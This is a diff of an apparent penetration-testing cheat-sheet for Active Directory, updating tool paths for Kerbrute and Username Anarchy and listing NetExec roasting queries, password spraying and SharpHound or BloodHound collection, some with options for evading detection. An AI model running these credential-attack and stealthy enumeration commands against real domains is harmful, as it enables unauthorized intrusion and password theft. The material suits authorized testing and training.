@@ -168,12 +168,12 @@ LDAP Authenticated:nxc ldap <target> -u '<user>' -p '<password>' --password-not-
 LDAP Authenticated:nxc ldap <target> -u '<user>' -p '<password>' --admin-count # Find admin accounts; kali-machine
 LDAP Authenticated:nxc ldap <target> -u '<user>' -p '<password>' --asreproast asrep.out # AS-REP roast with creds; kali-machine
 LDAP Authenticated:nxc ldap <target> -u '<user>' -p '<password>' --kerberoasting output.txt # Kerberoast with creds; kali-machine
-Kerbrute:/home/kali/Tools/kerbrute_linux_amd64 userenum -d <domain> --dc <dc-ip> <wordlist1> # Enumerate users via Kerberos; kali-machine
-Kerbrute:/home/kali/Tools/kerbrute_linux_amd64 userenum -d <domain> --dc <dc-ip> <wordlist1> | grep -i '@<domain>' | awk '{print $2}' | cut -d '@' -f1 > users.txt # Extract clean usernames; kali-machine
-Kerbrute:/home/kali/Tools/kerbrute_linux_amd64 bruteuser -d <domain> --dc <dc-ip> <wordlist1> <user> # Brute force single user; kali-machine
-Kerbrute:/home/kali/Tools/kerbrute_linux_amd64 passwordspray -d <domain> --dc <dc-ip> users.txt <password> # Password spray; kali-machine
-Username Anarchy:/home/kali/Tools/username-anarchy/username-anarchy -i <wordlist1> # Generate username permutations; kali-machine
-Username Anarchy:/home/kali/Tools/username-anarchy/username-anarchy --recognise <user> # Analyze username scheme; kali-machine
+Kerbrute:/home/kali/Tools/windows/kerbrute_linux_amd64 userenum -d <domain> --dc <dc-ip> <wordlist1> # Enumerate users via Kerberos; kali-machine
+Kerbrute:/home/kali/Tools/windows/kerbrute_linux_amd64 userenum -d <domain> --dc <dc-ip> <wordlist1> | grep -i '@<domain>' | awk '{print $2}' | cut -d '@' -f1 > users.txt # Extract clean usernames; kali-machine
+Kerbrute:/home/kali/Tools/windows/kerbrute_linux_amd64 bruteuser -d <domain> --dc <dc-ip> <wordlist1> <user> # Brute force single user; kali-machine
+Kerbrute:/home/kali/Tools/windows/kerbrute_linux_amd64 passwordspray -d <domain> --dc <dc-ip> users.txt <password> # Password spray; kali-machine
+Username Anarchy:/home/kali/Tools/git-tools/username-anarchy/username-anarchy -i <wordlist1> # Generate username permutations; kali-machine
+Username Anarchy:/home/kali/Tools/git-tools/username-anarchy/username-anarchy --recognise <user> # Analyze username scheme; kali-machine
 SharpHound.ps1:Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\Public -OutputPrefix bh #collect full AD enumeration dataset and save BloodHound JSON output to writable Public directory; target-machine
 SharpHound.ps1:Invoke-BloodHound -CollectionMethod All -Domain <domain> -OutputDirectory C:\Users\Public -OutputPrefix bh #enumerate full domain data explicitly when multiple domains or trust scenarios exist; target-machine
 SharpHound.ps1:Invoke-BloodHound -CollectionMethod All -Stealth -OutputDirectory C:\Users\Public -OutputPrefix bh #run full collection with stealth mode to reduce noisy queries against domain controllers; target-machine
@@ -181,7 +181,6 @@ SharpHound.ps1:Invoke-BloodHound -CollectionMethod All -ZipFile bh.zip #collect 
 SharpHound.ps1:Invoke-BloodHound -CollectionMethod All -ZipFile bh.zip -OutputDirectory C:\Users\Public #collect full dataset and store compressed BloodHound output in Public directory; target-machine
 SharpHound.ps1:Invoke-BloodHound -CollectionMethod All -OutputPrefix bh -RandomizeFilenames #randomize output filenames to evade simple defensive detection rules; target-machine
 SharpHound.ps1:Invoke-BloodHound -CollectionMethod All -Throttle 2000 -Jitter 30 -OutputDirectory C:\Users\Public #slow enumeration speed and add jitter to reduce detection and avoid overloading domain controllers; target-machine
-SharpHound.ps1:Invoke-BloodHound -CollectionMethod All -ZipFile loot.zip
 BloodHound Python:bloodhound-python -d <domain> -u <user> -p <password> -dc <dc-ip> -c All # Collect all BloodHound data; kali-machine
 BloodHound Python:bloodhound-python -d <domain> -u <user> -p <password> -dc <dc-ip> -c Group,LocalAdmin,RDP,DCOM,Session # Collect specific data; kali-machine
 BloodHound Python:bloodhound-python -d <domain> -u <user> -p <password> -dc <dc-ip> -c All --zip # Collect and zip; kali-machine
